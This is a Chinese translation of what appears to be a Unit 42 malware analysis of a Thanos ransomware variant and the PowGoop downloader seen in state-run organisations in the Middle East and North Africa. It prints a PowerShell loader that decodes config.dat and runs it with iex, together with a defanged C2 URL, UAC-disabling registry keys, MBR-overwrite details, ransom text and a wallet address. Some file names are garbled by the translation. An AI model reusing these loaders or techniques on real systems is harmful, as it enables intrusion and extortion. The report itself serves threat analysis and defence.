Thanos勒索软件是由Recorded
Future在2020年2月首次发现的，当时它在地下论坛上做广告出售。Thanos勒索软件的代码与其他勒索软件变体（例如Hakbit）重叠，并且具有允许用户使用各种可用设置自定义样本的构建器。该勒索软件似乎仍在积极开发中，因为与Recorded
Future分析的原始样本相比，我们观察到了在中东和北非国有企业运行的样本中新增的功能。实际上，运行在这两个组织网络上的Thanos勒索软件在可用功能上更接近于Fortinet在2020年7月讨论的变体。最明显的区别是，这些示例中没有提供Fortinet讨论的禁用安全启动的功能。
与其他Thanos勒索软件示例一样，在这两个组织的网络上运行的变体使用2048位RSA公钥加密文件扩展名与表1中列出的文件扩展名匹配的文件。加密文件内容后，Thanos会将文件扩展名“.locked”添加到磁盘上的文件中。
表1. Thanos将加密的文件扩展名列表。
Thanos的这种变体将赎金记录写入名为“HOW_TO_DECYPHER_FILES.txt”的文件到桌面以及包含Thanos加密的文件的所有文件夹中。如图2所示，赎金记录要求将价值“
20,000美元”的比特币转移到钱包“1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9”和联系电子邮件“PI:EMAIL”，以恢复加密文件。Fortinet博客和几条推文中显示的.HTA赎金说明显示，其他研究人员和组织在2020年7月看到了联系电子邮件和比特币钱包ID
。
Thanos勒索软件中的功能已被其他组织进行了分析。除了重新散布该分析之外，我们将仅讨论在此Thanos变体中启用的功能，而以前没有讨论过。但是，我们分别在表2和3中描述了在Thanos的此变体中禁用和启用的先前讨论的功能。
表2.禁用的功能，可能是Thanos勒索软件构建器用户界面（UI）上的未选中框。
表3.启用的功能，可能是Thanos勒索软件构建器UI上的复选框。
启用的第一个配置选项与先前的Thanos变体的分析不匹配，首先是代码尝试禁用用户帐户控制（UAC），方法是将`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`中的键“LocalAccountTokenFilterPolicy”和“EnableLinkedConnections”设置为1。然后，它尝试枚举本地和映射的存储卷。与omlocker用于枚举卷的本地脚本几乎完全相同。Ragnar
Locker使用此脚本创建一个VirtualBox配置文件，该文件将这些卷设置为SharedFolders，从而允许Ragnar
Locker在VirtualBox虚拟机中运行时访问本地存储卷，正如[Sophos](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/
"Sophos")所讨论的那样。Thanos实现不会将结果写入VirtualBox配置文件。相反，它只是将配置打印到屏幕上，但不保存输出。因此，我们无法确定此功能的用途。
此示例中启用的第二个功能在以前的Thanos变体中没有观察到，它涉及覆盖主引导记录（MBR）的能力。一旦代码检查操作系统版本不是“Windows
10”而是“Windows
8”，代码将尝试打开“\\.\PhysicalDrive0”并写入512字节字符串以偏移0。写入“\\.\PhysicalDrive0”偏移量0的字节数组最初有一条勒索消息：“您的文件已加密”。联系我们：PI:EMAIL“…”，但在写入磁盘之前，代码将用以下字符串替换此字符串：
    Don\xe2\x80\x99t worry, you can return all your files!\r\n\r\nThe Price to get all things to the normal : 20,000$\r\nMy BTC Wallet ID :\r\n1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9\r\n\r\nContact: PI:EMAIL\r\n
在此特定示例中覆盖MBR的有趣之处在于它无法正常工作，这可以归因于编程错误或参与者包括的自定义消息。如上所示，自定义消息中的撇号字符的字节为“\xe2\x80\x99”，但代码尝试使用转换.ToByte函数替换初始赎金字符串中的单个字节。但是，Unicode单引号字符是三个字节长，并导致异常，该异常打破了MBR覆盖功能。我们确认，更改此单个字符后，MBR覆盖功能将起作用，从而导致显示以下内容，而不是Windows正常启动：
在Thanos示例中，第三个先前未提及的功能涉及创建监视新连接的存储卷的线程。该代码使用管理事件监视程序，当使用以下WMI查询连接新的存储卷时，该事件监视程序将调用函数：
    SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2
当事件监视程序检测到新连接的存储卷时，它将创建一个线程，该线程执行Thanos用来加密原始存储卷上的文件的文件加密功能。
此版本的Thanos中添加的最后一个功能是能够检测并杀死更多分析工具以逃避检测和分析的能力。该示例将枚举正在运行的进程，并杀死名称与以下内容匹配的进程：
表4.此Thanos变体将检测并杀死以逃避检测的工具列表。
## 可能相关的下载器：PowGoop简介
虽然我们无法确认这一联系，但我们相信，在中东国营组织部署塔诺斯勒索软件的人也使用了一个我们称之为PowGoop的下载程序。参与者将使用PowGoop下载器联系远程服务器，下载并执行其他PowerShell脚本。这些文件与前面讨论的LogicalDuckBill示例存在于同一个环境中，但是我们没有观察到具体运行PowGoop和LogicalDuckBill扩展器的参与者。而且，正如预期的那样，这个下载器中的PowerShell代码和LogicalDuckBill之间几乎没有代码重叠，因为它们的功能差别很大。唯一的代码重叠是一个公共变量名$a，这两个脚本在解码之前都用来存储base64编码的数据，这不是一个足够强的连接，不足以建议一个共同的作者。
PowGoop下载程序有两个组件：DLL加载程序和基于PowerShell的下载程序。PowGoop加载器组件负责解密和运行包含PowGoop下载器的PowerShell代码。与LogicalDuckBill位于同一环境中的PowGoop加载程序DLL的文件名为谷歌更新.dll这很可能是由合法的和签名的googleupdate可执行文件附带的。旁加载过程将从合法的谷歌更新.exe文件正在加载名为goupdate86.DLL的合法DLL。当goopdate86.dll库加载谷歌更新.dll文件，它有效地运行PowGoop加载程序。我们观察到以下可能相关的文件：
表5.与PowGoop下载器的侧面加载相关的文件列表。
goopdate.dll文件是PowGoop加载程序，其功能存在于名为DllRegisterServer的导出函数中。goopdate.dll文件的DllEntryPoint函数（如果通过上述侧面加载过程加载了该函数，则将被调用），无非就是尝试使用以下命令来运行DllRegisterServer导出的函数：`rundll32.exe
,DllRegisterServer`
DllRegisterServer中的功能代码读取名为config.dat的文件，对其进行解码并将其作为PowerShell脚本运行，该脚本是PowGoop下载器组件。为了解码config.dat文件，DLL使用CreateProcessA函数构建并执行PowerShell脚本。由PowGoop加载程序构建的PowerShell脚本将读取config.dat文件的内容，使用简单的两个减法运算法则对base64内容进行解码和解密，并使用IEX命令运行结果PowGoop下载程序脚本，如下所示：
    powershell -exec bypass function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] – 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content C:\\Users\\[username]\\Desktop
    config.dat;$t =bDd $a;iex($t);
我们解密的config.dat文件是PowGoop下载器，参与者将其配置为使用以下URL作为其命令和控件（C2）：`http://107.174.241[.]175:80/index.php`
PowGoop下载器将通过对此URL的HTTP
GET请求与C2服务器通信。它期望C2服务器用base64编码的数据响应请求，脚本将对这些数据进行解码，并使用System.IO.压缩.GzipStream，然后使用用于解密配置数据文件。它将首先与指挥控制系统通信，以获得指挥与控制系统将分配给受损系统的唯一标识符值。在获得此标识符后，脚本将继续与C2通信以获取任务，该脚本将解码、解压缩、解密并作为PowerShell脚本运行。该脚本通过使用add-by-two密码对结果进行加密、压缩密文并对其进行base64编码，并使用GET请求将其发送到C2服务器，其中包含HTTP请求的Cookie字段中的数据，特别是R值。
## 结论
Actors使用Thanos勒索软件对文件进行加密，并使用PowerShell脚本将其传播到其他系统，特别是在中东和北非两个国有组织的网络上。Thanos变体创建了一个文本文件，该文件显示赎金消息，要求受害者将“20,000
$”转入指定的比特币钱包以恢复系统上的文件。
尽管Thanos勒索软件不是新的，但由于这些攻击中使用的变体包含新功能，因此它仍处于积极开发中。新功能包括检测和逃避更多分析工具的能力，通过Ragnar
Locker勒索软件使用的技术对本地存储卷进行枚举以及监视新连接的存储设备的新功能。
最重要的是，Thanos的这种变体还包括覆盖MBR并显示相同赎金消息的新功能。覆盖MBR是一种比Thanos以前使用的破坏性更大的勒索软件，即使受害者支付了赎金，受害者也需要付出更多的努力才能恢复其文件。
通过以下方式，Palo Alto Networks客户可以免受此博客中讨论的攻击的侵害：
  * 所有已知的Thanos勒索软件和LogicalDuckBill样本在[WildFire](https://www.paloaltonetworks.com/products/secure-the-network/wildfire "WildFire")中都有恶意判定。
  * AutoFocus客户可以使用标签[Thanos](https://login.paloaltonetworks.com/?resume=/idp/PoIdl/resumeSAML20/idp/startSSO.ping&spentity=CanarySp "Thanos")，[LogicalDuckBill](https://autofocus.paloaltonetworks.com/#/tag/Unit42.LogicalDuckBill "LogicalDuckBill")和[PowGoop](https://login.paloaltonetworks.com/?resume=/idp/njEtr/resumeSAML20/idp/startSSO.ping&spentity=CanarySp "PowGoop")跟踪此勒索软件，PowerShell传播脚本以及可能相关的下载器。
  * [Cortex XDR](https://www.paloaltonetworks.com/cortex/cortex-xdr "Cortex XDR")阻止了Thanos勒索软件，LogicalDuckBill和PowGoop。
* * *